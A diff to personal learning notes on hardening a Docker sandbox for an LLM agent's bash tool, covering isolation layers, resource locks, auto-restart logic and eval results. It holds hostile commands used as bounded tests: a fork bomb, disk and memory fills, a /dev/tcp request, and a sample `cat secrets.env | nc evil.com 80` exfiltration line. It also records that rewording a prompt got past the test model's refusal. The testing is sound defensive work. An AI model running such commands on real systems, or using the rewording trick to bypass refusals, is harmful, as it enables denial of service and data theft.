@@ -352,3 +352,162 @@ Status: `idea` → `drafted` → `posted`. One finding per post, with the number
 - Post idea 28: "My agent's allowlist said `^ls` is safe. `ls && cat secrets.env | nc evil.com 80` starts with ls. You can't make bash safe by matching text — auto-allow only plain commands, and let the sandbox do the real work."
 
 - Post idea 29: "Where you redact matters. My harness spills every tool result to disk before capping it — a redaction hook that runs after the cap would have left the API key sitting in .outputs/. Redact first, then write."
+
+---
+
+## Week 4 — chunk 1: what I learnt (isolation layers) — 2026-10-23
+
+My analogies:
+- **Namespaces** — a room inside the house. "Root" is only root of the room, not the house; I can't repaint the neighbour's room.
+  *Correction from review:* the room mostly *hides* things (frosted windows). What blocked `/etc/shadow` was the kernel checking my **real** ID (passport), not the room. Room = what I see; passport = what I can touch.
+- **cgroups** — a spending cap: if I'm given 500 rupees I can't spend more. *Addition:* one wallet per resource (pids, memory, cpu, io) — running out of one says nothing about the others.
+- **Capabilities** — keys to rooms; no key, no action. Root without keys is root in name only.
+- **seccomp** — the watchman at the gate: checks whether I'm allowed in at all, before anyone checks my keys inside. Checks *what I ask*, not *who I am*.
+
+| Layer | Demo that proved it | Does NOT stop |
+|---|---|---|
+| Namespaces | `unshare --user --map-root-user --pid --mount-proc`: whoami=root, 3 processes, /etc/shadow denied | Resource exhaustion — fork bomb copies still share host CPU/process table |
+| cgroups | `systemd-run --user --scope -p TasksMax=5`: 4 sleeps started, 5th fork failed | Only the resource it meters — `--memory` alone doesn't stop a fork bomb; disk *space* isn't a cgroup at all |
+| Capabilities | redis:7 as root: `chown` OK by default, `Operation not permitted` with `--cap-drop=ALL` | Unprivileged actions — `rm` on own files, `curl`, disk fill |
+| seccomp | `unshare` blocked by Docker's default filter, works with `seccomp=unconfined` | Anything done with allowed syscalls — `open/write/connect` are all allowed |
+
+Rule: attacks that need no special power (rm, curl, disk fill) are stopped only by taking the resource away — `--read-only`, `--network none`, a size-capped tmpfs/volume.
+(Demo + "does NOT stop" columns filled by Claude at user's request; user to read later.)
+
+## Week 4 — chunk 2: Docker defaults vs 3 bounded attacks — 2026-10-24
+
+Prediction (mine): defaults stop curl and the fork bomb. **Actual: defaults stopped 0/3.**
+
+| Attack (bounded) | Result | Why it got through |
+|---|---|---|
+| 300 background `sleep`s | `running: 304` | no pids cgroup limit by default |
+| `dd` 200 MB into `/` | written in 0.07s; `df /` shows **468G** = the laptop's real disk | container's writable layer lives in /var/lib/docker on the host; disk space isn't a cgroup |
+| bash `/dev/tcp` to example.com:80 | `HTTP/1.1 200 OK` | container gets its own net namespace, but Docker wires it to the host bridge + NAT |
+
+Lesson: Docker's defaults are built for *running apps*, not for *containing an attacker*. seccomp/caps were on the whole time and were irrelevant — none of these needs a privilege.
+
+## Week 4 — chunk 3: one lock at a time, REAL attacks
+
+**Lock 1 — fork bomb vs `--pids-limit 100`** (2026-10-25, user ran it; `--cpus 2 --memory 256m` kept generous so only pids is under test)
+`b(){ b|b& }; b` → `procs: 100/100`, 393× `fork: retry: Resource temporarily unavailable`, laptop fine, container gone after `timeout 25`.
+Who refused the 101st: the **kernel** (cgroup pids controller returns EAGAIN on fork). Docker only wrote `100` into `pids.max` at start; bash just printed the error and retried. (User skipped this check question; answered in review.)
+Principle learnt: change one lock at a time, keep every other limit generous so you know which lock fired.
+
+**Lock 2 — memory hog vs `--memory 128m --memory-swap 128m`** (2026-10-25, user ran it)
+`head -c 1G /dev/zero | tail` → `Killed` (OOM killer, inside the container only), no SURVIVED.
+Swap loophole (Claude's pre-test): `--memory 128m` alone → a 200 MB hog **finished OK** by spilling into swap; with `--memory-swap 128m` → Killed.
+Docker defaults: `--memory` set, `--memory-swap` unset → swap allowance = same again (total 2× = 256m). No `--memory` at all → unlimited, up to the host's swap.
+Check question: user said a 1 GB hog would survive "till swap is over" — right mechanism; with numbers it dies at 256m (128 RAM + 128 swap), so it never survives.
+
+**Lock 3 — disk fill vs `--read-only --tmpfs /tmp:size=64m`** (2026-10-25, user ran it)
+500 MB to `/` → `Read-only file system`; unbounded write to `/tmp` → `No space left on device` at 64 MiB; host disk untouched.
+`/dev/shm` (Docker adds a 64M one automatically) is also tmpfs → lives in RAM/swap, not on disk, and counts toward `--memory`. User got this right: "it's in swap or RAM, not the disk".
+
+**Lock 4 — network vs `--network none`** (2026-10-26, user ran it)
+Interfaces: only `lo`. Direct IP `1.1.1.1:80` → `Network is unreachable` (name lookups fail too: `Temporary failure in name resolution`).
+Check question "why isn't blocking DNS enough?" — user: "it can be done with the IP also" ✔. Plus: DNS itself can carry data out (DNS tunnelling), so a DNS-only block fails both ways.
+
+**Lock 5 — root powers vs `--user 1000:1000 --cap-drop=ALL --security-opt no-new-privileges`** (2026-10-26, user ran it)
+`uid=1000`, `CapEff: 0000000000000000` (zero keys), `NoNewPrivs: 1`, `/tmp` still writable, `/etc/passwd` → Read-only, `chown` → Operation not permitted.
+Check question "why cap-drop if UID 1000 has no caps anyway?" — user: "stop dangerous operations" (vague). Answer: defence in depth — if something *does* get root back (a kernel/setuid bug, or someone later changes `--user`), that root still holds zero keys. Each lock assumes the one before it might fail.
+
+### Chunk 3 summary — the hardened command (all 5 real/bounded attacks stopped)
+```
+docker run --rm --pids-limit 100 --memory 256m --memory-swap 256m \
+  --read-only --tmpfs /tmp:size=64m --network none \
+  --user 1000:1000 --cap-drop=ALL --security-opt no-new-privileges  IMAGE ...
+```
+| Attack | Lock | What stopped it (layer) |
+|---|---|---|
+| fork bomb (real) | `--pids-limit 100` | kernel cgroup pids → fork EAGAIN at 100/100 |
+| memory hog 1 GB | `--memory` + `--memory-swap` equal | kernel cgroup memory → OOM kill inside container |
+| disk fill | `--read-only` + capped `--tmpfs` | read-only mount + tmpfs size cap (lives in RAM, counts toward --memory) |
+| network out | `--network none` | empty net namespace, only `lo` |
+| root powers | `--user` + `--cap-drop=ALL` + `no-new-privileges` | normal UID, zero capabilities, setuid ignored |
+Still rootful Docker (daemon runs as root) — rootless decision pending, see chunk 5.
+
+## Week 4 — chunk 4: run_bash moved into the box — 2026-10-26
+
+User built it in `mcp_server.py`: `start_sandbox()` = `docker run -d --rm` + 5 locks + `-v <cwd>:/work:ro|rw` + `sleep 3600` (self-destruct); `run_bash` = `docker exec <id> timeout 30 bash -c cmd`, exit 124 → TimeoutError; `finally: docker rm -f`. eval.py passes `--rw` only when `needs_write`. Description built from WRITABLE so the model is told the truth.
+Review bugs fixed: `.capitalize()`→`.strip()`, `-i -t` where the inner `timeout` belonged, outer `except Exception` swallowing the new raise (same as week-3 read_file bug), f-string to subprocess without shell, `--rw` passed to every task.
+Learnt: Python's `timeout=` kills only the `docker exec` client — the command keeps running inside (tested: `sleep 60` still alive). The timer must run INSIDE the box.
+Learnt: single-file bind mounts break `sed -i` (it writes a temp file next to the original, then renames) → mount the throwaway eval workdir instead.
+
+Verified on scratch copies: uid=1000 in /work; network unreachable; /work read-only without --rw; `sed -i` works with --rw and file stays owned 1000:1000; `sleep 40` → isError True; `finally` removed the box even when the server crashed with BrokenPipeError.
+
+**Eval through the sandbox (qwen-local, 3 runs): 23/30 = 77%** (was 18/30 = 60%), 0 crashes, 0 boxes left after 30 container starts/removals. results/qwen-local-sandboxed.jsonl.
+Honest reading: qwen made **0 run_bash calls** (39 read_file, 3 write_file) — same as before — so the eval did NOT exercise the box; the +17pts is run-to-run noise on the counting tasks (01, 02, 07). It proves "the sandbox didn't break anything", not "the agent works in the sandbox".
+
+### Surprise: fork bomb through run_bash (2026-10-27, Claude test on scratch copy, before the agent-attack step)
+Prediction (user): isError True via the inner timeout. **Actual:** call 1 returned in <2s with `exit code: 0`, isError **False** (stderr full of `fork: retry`). `b(){ b|b& }; b` backgrounds itself and the top bash exits at once — `timeout` only watches its direct child, so it never fires.
+The bomb kept running inside the box at 100/100 pids → call 2 `echo still usable` → `exit code: 125`, `timeout: fork system call failed`. **The box is bricked for the rest of the agent run.** Laptop fine (load ~2), `finally` still removed the box.
+Lesson: the locks protect the *host*, not the *box's usefulness*. Background processes outlive the command that started them.
+
+**Recovery design (2026-10-27):** user chose A = auto-restart the box when leftovers remain (vs B = new box per command). Correction from review: B does not "start over" — the model's memory is the conversation and /work is a mount, both survive either way; B only loses /tmp + bg processes, but pays ~0.5s on *every* call. A pays only when something goes wrong. Pre-test: `docker top` sees leftovers from outside even when the box is full (56 listed); `docker restart -t 0` = 146 ms; /work kept, /tmp wiped, 4 procs after. Build pending (skeleton given: leftover_count, restart, [sandbox] note, restart also on the 124 path?).
+
+### Week 4 status (2026-10-27) — ~65%
+| Chunk | Status |
+|---|---|
+| 1 namespaces / cgroups / caps / seccomp | done |
+| 2 attack Docker defaults (0/3 stopped) | done |
+| 3 five locks, real attacks by hand | done (card Done-when met by hand) |
+| 4 run_bash in the box | ~70%: built + eval through box done; auto-restart + agent-runs-the-attacks left |
+| 5 Docker vs gVisor vs Firecracker, rootless decision | not started |
+
+### Week 4 chunk 4 — auto-restart after leftovers (2026-10-27)
+- Built: `leftover_count()` (docker top lines − 2: header + PID1 sleep). After every exec, if > 0 → `docker restart -t 0` + a `[sandbox]` note (bg killed, /tmp wiped, /work kept). Check runs BEFORE the 124 raise, so a timeout also carries the note.
+- Bugs on first try: `-t, 3600` was an int in the argv list (TypeError → box stayed bricked forever, every call failed); and 3600 was the wrong meaning: `-t` = grace seconds between SIGTERM and SIGKILL, not lifetime. PID1 `sleep` has no SIGTERM handler and PID1 ignores unhandled signals, so Docker would wait the whole grace → a 1-hour hang. Nothing worth saving → `0`.
+- Verified on a scratch copy: fork bomb → exit 0 + note → next `echo still usable` works (was exit 125 before). `setsid sleep 100 & sleep 40` → timeout error + note, /tmp wiped, next call works. 0 boxes left.
+- Correction (mine): I said `sleep 100 & sleep 40` would leave `sleep 100` behind after a timeout. Wrong: GNU `timeout` puts itself in its own process group and signals the whole group, and non-interactive bash keeps bg jobs in that group, so it died (no note, /tmp/j survived). Only a process that leaves the group (`setsid`, daemons) survives a timeout. The fork bomb escapes for a different reason: it returns in <2s, so `timeout` never fires.
+- Open: fork bomb stderr returns ~100 "fork: retry" lines to the model — output truncation is still commented out.
+
+### Week 4 chunk 4 — the agent attacks its own box (2026-10-27, qwen-local)
+Driver: scratchpad `attack.py` = real Agent + sandboxed mcp_server, prompts "run exactly this". Policy layer turned OFF for the box tests (one lock at a time).
+
+| Attack | Stopped by | Agent saw |
+|---|---|---|
+| Fork bomb, real policy | **policy** (SHELL_META → never auto-allow compound cmd → unattended deny) — never reached the box | policy deny |
+| Fork bomb, policy off | pids-limit 100 + auto-restart | exit 0 + `[sandbox]` note; next `echo alive` worked |
+| Disk fill /work, ro box | `:ro` mount | "Read-only file system" |
+| Disk fill /tmp | tmpfs size=64m | "No space left on device" at 64 MiB |
+| Disk fill /work, `--rw`, workdir on host /tmp (tmpfs = RAM) | memory 256m — tmpfs pages are charged to the writer's cgroup | **exit 137 on dd AND on the next `ls`: box bricked by memory, no restart** (leftover_count = 0, it counts processes) |
+| Disk fill /work, `--rw`, workdir on real disk (by hand) | **nothing** — 300M written, rc 0 | hole |
+| Network | `--network none` ("Network is unreachable"); also no curl in image (127); DNS fails (getent 2) | blocked |
+
+Findings:
+- Defence in depth showed up for real: the week-3 policy stopped the fork bomb before the box did.
+- Hole 1: `--rw` mount has no size cap — on disk the agent can fill the host disk (bind mounts ignore every container limit). Fix options: put the eval workdir on a size-limited tmpfs/loop file, or quota.
+- Hole 2: the auto-restart only detects leftover processes. A memory-full box (file in tmpfs workdir) returns 137 forever. By hand: `docker restart -t 0` fixed it even with the file still there. Detection idea: exit 137 → restart.
+- qwen refused the network test when the prompt said "attack" — rewording to "my own test container, checking limits" worked.
+- Fork bomb output still costs ~110 "fork: retry" lines (~1.1k tokens) — truncation still off.
+
+### Week 4 chunk 4 — hole 2 fix: health probe (2026-10-27)
+- Built (user): `box_broken()` = `docker exec CONTAINER true`, rc != 0 → broken. Restart if `leftover_count() > 0 or box_broken()`. A probe of the real state instead of guessing from exit 137 (137 also = one command OOM-killed or `kill -9`, box still fine). Cost: ~56 ms per call.
+- Verified (scratch, workdir on host tmpfs, --rw): dd 300M → 137 + note → next `ls; echo alive` works.
+- New finding: after the restart the 256m memory meter starts from zero, but the 256M file is still in host RAM. A further 100M write then succeeded → 360M of host RAM used. Each brick→restart cycle lets the agent take another ~256M. The restart turned the memory lock into a refillable one. The real fix is hole 1 (size-cap the workdir), not a smarter restart.
+- Note text is now wrong for this case: it says "leftover background processes were killed" when the cause was memory. The model can't tell what happened.
+
+### Week 4 chunk 4 — hole 1 fix: the /work bucket + honest note (2026-10-28)
+- Bucket: `~/.local/share/sre-work.img` (1G sparse, ext4, made without root, `root_owner=1000:100`) mounted at `/srv/sre-work` via `fileSystems` in nixos-config `hosts/laptop/default.nix` (`loop nofail nosuid nodev`). Disk-backed on purpose: writes become reclaimable page cache, not tmpfs pages charged to the box's memory cgroup → disk fill trips the disk cap, not the memory lock. Dry-build: 10 small drvs (fstab/etc only).
+- Why on the host, not in the box: tested — `--tmpfs /work` and a docker tmpfs volume are both EMPTY after `docker restart`, which breaks the restart-and-continue design; and read_file/write_file + the grader read the host folder.
+- eval.py: `mkdtemp(dir=BUCKET)`; body wrapped in try/finally → `keep_transcript_and_clean()` copies transcript.jsonl to `results/transcripts/<workdir>.jsonl` then rmtree (grade runs first). Start of run: refuse unless `os.path.ismount(BUCKET)` (a failed nofail mount leaves a plain dir on the real disk = silent no cap); wipe only `sre-eval-*` leftovers (lost+found belongs to the fs). Result field `workdir` → `transcript`.
+- mcp_server note now names the cause: leftover processes vs could-not-start-a-process (likely OOM). Verified on scratch: both notes appear, `echo alive` after. eval refuses to run with the bucket unmounted.
+
+### Week 4 chunk 4 — bucket verified + a new recovery bug (2026-10-28)
+- Mounted: `/srv/sre-work` = /dev/loop0 ext4, 974M, `nosuid,nodev`. Fill test: dd 1200M stopped at 949 MB "No space left on device". Hole 1 closed.
+- Through the server in the bucket (3/3 runs): dd 300M → exit 0 (disk, no memory trip), dd 900M more → exit 1 "No space left", `echo alive` → works. Bucket afterwards holds only lost+found.
+- One-off: the very first run (right after the first fill on the freshly made fs) got 137 on the 300M dd and the box VANISHED. Not reproduced in 6 further runs (3 server, 3 by hand incl. right after a 900M fill; oom_kill 0). Cause unproven — likely writeback pressure; ext4 lazy inode-table init on a fresh fs is a guess, not verified.
+- Real bug it exposed (reproduced deterministically with `docker kill` mid-session): if PID 1 dies, `--rm` deletes the box; `docker restart` then fails "No such container", the result is not checked, the note still says "restarted", and EVERY later call fails. Recovery must check the restart and recreate the box with `start_sandbox()` if it is gone (/work survives — it's on the host).
+
+### Week 4 chunk 4 — recover() (2026-10-28)
+- Built (user): `recover()` — `docker restart -t 0`; if rc != 0 the box is gone → `CONTAINER = start_sandbox(os.getcwd(), WRITABLE)` under `global CONTAINER`.
+- Verified (scratch, bucket): kill box mid-session → next call gets "old sandbox had died, so a new one was started" → `cat /work/f` = keep (host-side /work survives a new box) → fork bomb → "restarted" → `echo five` works. 0 boxes after exit (finally removes the NEW id because it reads the updated global).
+- Left in: the old `docker restart` line before `recover()` → two restarts per recovery (harmless, ~150 ms wasted). Delete it.
+- `global` correction: reading a global needs no keyword (leftover_count does it). Assigning anywhere in a function makes the name local for the WHOLE function, so the read on the restart line above the assignment raises UnboundLocalError. If the assignment came first, there'd be no error at all — just a silent local, and run_bash/finally would keep using the dead id.
+- Dead-box case: the command never ran, but the model sees "exit code: 1" + note. Note could say "your command did not run, run it again".
+
+### Week 4 chunk 4 — cleanup verified with a real agent run (2026-10-28)
+- Duplicate restart line removed; one restart per recovery now.
+- qwen-local, tasks 09 (needs_write, --rw) PASS and 01 FAIL (answered 3, expected 5 — model miss, not the box). Bucket after each task: only lost+found. Transcripts kept in results/transcripts/, result rows point at them. 0 boxes left.
+- Stale wipe: a planted `sre-eval-stale` was removed at eval start; `not-ours` and `lost+found` were left alone.
+- Hole 1 + hole 2 closed. Chunk 4 done.
